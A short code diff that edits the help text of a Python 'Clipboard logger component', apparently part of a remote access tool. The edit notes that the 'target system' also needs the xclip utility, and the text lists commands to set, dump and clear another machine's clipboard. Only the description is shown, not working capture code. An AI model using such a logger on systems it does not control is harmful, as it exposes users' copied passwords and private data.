@@ -27,6 +27,6 @@ def clip_logger(option):
     elif option == 'info':
         print '\nName             : Clipboard logger component' \
               '\nOS               : Linux' \
-              '\nRequired Modules : pyperclip (External), xclip utility for Linux (Non python external dependency)' \
+              '\nRequired Modules : pyperclip (External), xclip utility for Linux (Non python external dependency, target system needs to have this as well)' \
               '\nCommands         : clip_set <text to set clipboard to>, clip_dump, clip_clear' \
               '\nDescription      : Allows for control over the clipboard, set, read or clear the clipboard data\n'
